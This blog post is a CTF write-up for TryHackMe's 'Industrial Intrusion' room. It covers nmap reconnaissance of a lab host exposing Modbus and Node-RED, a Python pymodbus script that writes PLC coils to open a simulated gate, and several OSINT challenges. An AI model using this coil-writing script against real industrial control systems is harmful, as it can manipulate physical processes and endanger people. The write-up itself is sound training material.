---
layout: post
title: Industrial Intrusion CTF
date: 2025-07-04 22:05 +0300
---

# Industrial Intrusion CTF
link: [Industrial Intrusion CTF](https://tryhackme.com/room/industrial-intrusion)

## Breach
![](https://i.imgur.com/ORmXjhz.png)

After deploying the machine i got the ip: `10.10.184.62`.

Scanning the ip of the machine:

```
nmap -sS -p- -O -sV 10.10.184.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:42 EDT
Nmap scan report for 10.10.184.62
Host is up (0.071s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http          Werkzeug httpd 3.1.3 (Python 3.12.3)
102/tcp   open  iso-tsap      Siemens S7 PLC
502/tcp   open  modbus        Modbus TCP
1880/tcp  open  vsat-control?
8080/tcp  open  http          Werkzeug httpd 2.3.7 (Python 3.12.3)
44818/tcp open  EtherNetIP-2?

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
*** service fingerprint ***

Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; Device: specialized; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.82 seconds

```

There is a lot to cover up, let's start visiting the site of the ip (port 80).
![](https://i.imgur.com/jcABMtJ.png)

We can see a simple site with a image of close gate that we need to find a way to open.

let's look at the devtools to get more information:
![](https://i.imgur.com/mWAyQHd.png)

There is no hidden html or comments, but we see a script that call for `http://10.10.184.62:80/api/gate` to get the status of the gate.

After that we can go to `http://10.10.184.62:1880/` and we are greeted with Node-RED flow.
![](https://i.imgur.com/6BRck5o.png)

We can see two flows:

Read Coils 20-30:
![](https://i.imgur.com/6J39ziH.png)
This is a `modbus-read node` - that node connects to a Modbus server, periodically reads specific registers/coils Emits the data as a Node-RED msg object (typically under msg.payload).

we also can see what Modbus server that node connect to:
![](https://i.imgur.com/u0IuuDQ.png)
the server is `localhost:502`, we also saw that server on the nmap scan, so that mean we can send data to that Modbus server to interact with the flow.

After each `modbus-read node` we have functions:

function 1:
```
if (!msg.payload || !Array.isArray(msg.payload.data)) {
    node.warn("❌ No coil data available");
    return null;
}

const bits = msg.payload.data;

for (let i = 0; i < bits.length; i++) {
    if (bits[i]) {
        node.warn(`✅ Coil ${i} is TRUE`);
    }
}

// Output to motion and badge checker UI
return [
    { payload: bits[20] },   // Motion Detector (coil 20)
  
];
```

After the function we have a switch node:
![](https://i.imgur.com/9RfWh9V.png)

And a Modbus-Write node:
![](https://i.imgur.com/nzn9NDB.png)

flow 2:

Same `modbus-read node` Read Coils 20-30

function 2:
```
if (!msg.payload || !Array.isArray(msg.payload.data)) {
    node.warn("❌ No coil data available");
    return null;
}

const bits = msg.payload.data;

for (let i = 0; i < bits.length; i++) {
    if (bits[i]) {
        node.warn(`✅ Coil ${i} is TRUE`);
    }
}

// Output to badge checker UI
return [
    { payload: bits[25] },   
  
];
```

Switch node:
![](https://i.imgur.com/9RfWh9V.png)

Modbus-Write node:
![](https://i.imgur.com/dOgSwrT.png)

Another helpful feature in Node-RED is the debug panel:
![](https://i.imgur.com/el95hIy.png)

With the debugger open we can see that while the flows are active `Coil 25` and `Coil 20` are `True`.

Armed with all this information let's open the gate:
We need to send `10.10.184.62:502` data to turn `Coil 25` and `Coil 20` are off.

for that i wrote a scrip in python using pymodbus lib:
coil.py:
```
import argparse
from pymodbus.client import ModbusTcpClient

MODBUS_HOST = '10.10.184.62'  
MODBUS_PORT = 502              

def write_coil(client, coil_num, value):
    write_result = client.write_coil(coil_num, value)
    if write_result.isError():
        print(f"❌ Error writing coil {coil_num}.")
    else:
        print(f"✅ Coil {coil_num} set to {value}.")

def activate_coil(coil_num, value):
    client = ModbusTcpClient(MODBUS_HOST, port=MODBUS_PORT)

    try:
        if not client.connect():
            print("❌ Failed to connect to Modbus device.")
            return

        write_coil(client, coil_num, value)

    finally:
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Write a value to a Modbus coil.")
    parser.add_argument('--coil', type=int, required=True, help='Coil number to write.')
    parser.add_argument('--value', type=str, choices=['true', 'false'], default='false',
                        help='Value to write to the coil (true/false). Default is false.')

    args = parser.parse_args()

    coil_number = args.coil
    coil_value = True if args.value.lower() == 'true' else False

    activate_coil(coil_number, coil_value)

```

let's try it and see what happened:
![](https://i.imgur.com/l4GePzO.png)

After setting Coil 20 and 25 to False we see that the debugger say Coil 30 is True.

Going back to the gate we can see that now it is open and we have the flag:
![](https://i.imgur.com/JMcJ5q3.png)

🚩~flag found~🚩

## discord
![](https://i.imgur.com/N1rNdB5.png)

After joining the discord server and opening the #ctf-discord-challenge we can see at the topic the command `/secret-function`
using it in the chat give us the flag:
![](https://i.imgur.com/HqTnZjE.png)
![](https://i.imgur.com/Slpvcao.png)

🚩~flag found~🚩

## OSINT 1
![](https://i.imgur.com/Vq31CPn.png)

visiting `virelia-water.it.com` nothing seems out of the ordinary:
![](https://i.imgur.com/7jUwiXU.png)


searching subdomains using virustotal:
![](https://i.imgur.com/JduRxtQ.png)

we can see virustotal found a subdomain: `stage0.virelia-water.it.com`, using using `https://who.is/` reviled some more information about that subdomain:
![](https://i.imgur.com/JjbpQ3u.png)
We can see that the subdomain used to be `solstice-teach1.github.io` thats a site that hosted on Github using GitHub Pages (like this one 😊).
and from that we can understand that `solstice-teach1` is a github user:
![](https://i.imgur.com/dzptilO.png)

looking around in the user projects we found this html code:
![](https://i.imgur.com/uFxsp9I.png)

this url looks kinda weird, using CyberChef to convert from hex we get the flag:
![](https://i.imgur.com/0QqagUF.png)

Alternative way is to use `crt.sh` to find the Certificates history of `virelia-water.it.com` and we can see the url with hex flag.
![](https://i.imgur.com/BT13XR5.png)

🚩~flag found~🚩

## OSINT 2
![](https://i.imgur.com/JisTj8i.png)

Looking around the github user projects we found in OSINT 1 we found a url that lead us to another github user:
![](https://i.imgur.com/SdZ25o9.png)
![](https://i.imgur.com/PaVJqQS.png)

And going inside this user project we can see a fallback_dns url:
![](https://i.imgur.com/80F2kXM.png)

Using VirusTotal to get more info about this url reveals a TXT record:
![](https://i.imgur.com/RpUVUH4.png)

Using CyberChef to decode from Base64 reveal the flag:
![](https://i.imgur.com/ywTWNVb.png)

🚩~flag found~🚩

## OSINT 3
![](https://i.imgur.com/NcxGKXd.png)

Looking into the OT Alerts, the site give back a 404 error that the alert is no longer available so we need to find it somewhere else.
![](https://i.imgur.com/R1Prkgd.png)

using `https://who.is/` reviled some more information about `virelia-water.it.com`, We can see that the site used to be `virelia-water.github.io` thats a site that hosted on Github using GitHub Pages.
and from that we can understand that `virelia-water` is a github user:
![](https://i.imgur.com/kx8Jw6m.png)
![](https://i.imgur.com/yAHV2RQ.png)

using the commit history we can find the alert and the mysterious PGP.
![](https://i.imgur.com/al516Xv.png)

the OT-Alert:
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="index,follow">
  <title>OT Alerts Exceptions – June 2025</title>
  <link rel="stylesheet" href="/styles.css">
</head>
<body>
  <header><h1>OT Alerts Exception Report – June 2025</h1></header>
  <nav>
    <a href="/">Home</a>
    <a href="/mail-archives/">Archives Home</a>
    <a href="/policies/">Compliance Policies</a>
  </nav>
  <main>
    <p>This page lists <em>exceptional</em> OT-Alert messages for June 2025 only. Routine alerts have been redacted.</p>
    <div class="message">
      <div class="hdr">
        From: DarkPulse &lt;alerts@virelia-water.it.com&gt;<br>
        Date: Mon, 15 Jun 2025 02:15:00 +0000<br>
        Subject: Scheduled OT Calibration
      </div>
      <pre>
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Please confirm system integrity at 03:00 UTC.
-----BEGIN PGP SIGNATURE-----

iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
Sh5H
=jdL7
-----END PGP SIGNATURE-----
      </pre>
    </div>
  </main>
  <footer>&copy; 2025 Virelia Water Control Facility</footer>
</body>
</html>
```

The PHP SIGNATURE:
```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Please confirm system integrity at 03:00 UTC.
-----BEGIN PGP SIGNATURE-----

iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
Sh5H
=jdL7
-----END PGP SIGNATURE-----
```

using the signature we can find the RSA key/fingerprint of the pgp signature and look it up using `keyserver.ubuntu.com` to find the flag:
![](https://i.imgur.com/VOGIRSv.png)

🚩~flag found~🚩

## Chess Industry (Boot2root 1)
coming soon...

## Under Construction (Boot2Root 2)
coming soon...

## No Salt, No Shame (Crypto 1)
coming soon...

## Echoed Streams (Crypto 2)
coming soon...

## Start (pwn 1)
coming soon...
